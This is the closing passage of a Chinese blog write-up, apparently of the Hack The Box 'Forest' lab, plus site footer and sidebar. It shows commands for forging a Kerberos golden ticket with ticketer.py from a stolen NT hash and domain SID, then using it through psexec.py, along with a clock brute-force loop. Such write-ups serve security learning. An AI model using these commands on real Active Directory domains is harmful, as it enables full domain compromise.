+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid S-1-5-21-3072663084-364016917-1341370565 -domain htb.local evilarseneexport KRB5CCNAME&#x3D;&#x2F;tmp&#x2F;evilarsene.ccache</span><br></pre></td></tr></table></figure>
+
+<p>添加hosts，进行域名解析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.161    htb.local forest</span><br></pre></td></tr></table></figure>
+
+<p>之后-k参数使用黄金票据进行验证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py -k -no-pass HTB.LOCAL&#x2F;evilarsene@forest</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Forest/15.png" alt="15"></p>
+<p>为了上述解决时间问题，决定暴力枚举。首先我们需要在目标机器上获取除了小时后面的时间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; get-dateWednesday, May 26, 2021 8:18:18 PM</span><br></pre></td></tr></table></figure>
+
+<p>在本机上通过<code>date -s</code>暴力枚举，时间正常就可以使用黄金票据了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(seq 00 24);do date -s $i:19:00;psexec.py -k -no-pass HTB.LOCAL&#x2F;evilarsene@forest; done</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Forest/16.png" alt="16"></p>
+<p>其实这里最正确的方法是使用NTP协议(UDP端口123)和域控同步时间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate 10.10.10.161</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Windows%E9%9D%B6%E6%9C%BA/" rel="tag"># Windows靶机</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/05/24/HTB-Querier/" rel="prev" title="HTB:Querier">
+      <i class="fa fa-chevron-left"></i> HTB:Querier
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/05/29/HTB-Reel/" rel="next" title="HTB:Reel">
+      HTB:Reel <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">2.</span> <span class="nav-text">渗透</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BB%A5%E7%94%A8Account-Operators%E7%BB%84GenericAll%E6%9D%83%E9%99%90"><span class="nav-number">3.1.</span> <span class="nav-text">滥用Account Operators组GenericAll权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BB%A5%E7%94%A8Exchange-Windows-permissions%E7%BB%84WriteDacl%E6%9D%83%E9%99%90"><span class="nav-number">3.2.</span> <span class="nav-text">滥用Exchange Windows permissions组WriteDacl权限</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%951-PTH"><span class="nav-number">3.2.1.</span> <span class="nav-text">方法1 PTH</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%952-Goldenticket-for-Linux"><span class="nav-number">3.2.2.</span> <span class="nav-text">方法2 Goldenticket for Linux</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="EvilArsene"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">EvilArsene</p>
+  <div class="site-description" itemprop="description">人格面具操控者 <img src="http://www.hackthebox.eu/badge/image/278745" alt="Hack The Box"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">161</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/TZESS" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;TZESS" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Arsene_IP" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Arsene_IP" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilArsene</span>
+</div>
+
+<span id="sitetime"></span>
+<script language=javascript>
+	function siteTime(){
+		window.setTimeout("siteTime()", 1000);
+		var seconds = 1000;
+		var minutes = seconds * 60;
+		var hours = minutes * 60;
+		var days = hours * 24;
+		var years = days * 365;
+		var today = new Date();
+		var todayYear = today.getFullYear();
+		var todayMonth = today.getMonth()+1;
+		var todayDate = today.getDate();
+		var todayHour = today.getHours();
+		var todayMinute = today.getMinutes();
+		var todaySecond = today.getSeconds();
+		/* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+		year - 作为date对象的年份，为4位年份值
+		month - 0-11之间的整数，做为date对象的月份
+		day - 1-31之间的整数，做为date对象的天数
+		hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+		minutes - 0-59之间的整数，做为date对象的分钟数
+		seconds - 0-59之间的整数，做为date对象的秒数
+		microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+		var t1 = Date.UTC(2018,02,13,15,00,00); //北京时间2018-2-13 00:00:00
+		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+		var diff = t2-t1;
+		var diffYears = Math.floor(diff/years);
+		var diffDays = Math.floor((diff/days)-diffYears*365);
+		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+		document.getElementById("sitetime").innerHTML=" 已安全运行"+(diffYears-2)+" 年 "+diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+	}/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+	siteTime();
+</script>
+
+<script>
+console.log(`%c
+. . . . . . . . . . . . . . . . . . . . . . . . . . .
+.                                                   .
+.                      uuuuuuu                      .
+.                  uu$$$$$$$$$$$uu                  .
+.               uu$$$$$$$$$$$$$$$$$uu               .
+.              u$$$$$$$$$$$$$$$$$$$$$u              .
+.             u$$$$$$$$$$$$$$$$$$$$$$$u             .
+.            u$$$$$$$$$$$$$$$$$$$$$$$$$u            .
+.            u$$$$$$$$$$$$$$$$$$$$$$$$$u            .
+.            u$$$$$$"   "$$$"   "$$$$$$u            .
+.            "$$$$"      u$u       $$$$"            .
+.             $$$u       u$u       u$$$             .
+.             $$$u      u$$$u      u$$$             .
+.              "$$$$uu$$$   $$$uu$$$$"              .
+.               "$$$$$$$"   "$$$$$$$"               .
+.                 u$$$$$$$u$$$$$$$u                 .
+.                  u$"$"$"$"$"$"$u                  .
+.       uuu        $$u$ $ $ $ $u$$       uuu        .
+.      u$$$$        $$$$$u$u$u$$$       u$$$$       .
+.       $$$$$uu      "$$$$$$$$$"     uu$$$$$$       .
+.     u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$     .
+.     $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"     .
+.      """      ""$$$$$$$$$$$uu ""$"""              .
+.                uuuu ""$$$$$$$$$$uuu               .
+.       u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$      .
+.       $$$$$$$$$$""""           ""$$$$$$$$$$$"     .
+.        "$$$$$"                      ""$$$$""      .
+.          $$$"                         $$$$"       .
+.                                                   .
+.               Welcome to Console ;)               .
+. . . . . . . . . . . . . . . . . . . . . . . . . . .`,"color:#9acc14; background:black; font-family: monospace");
+</script>
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='' opacity='' zIndex='' count='' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
+
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
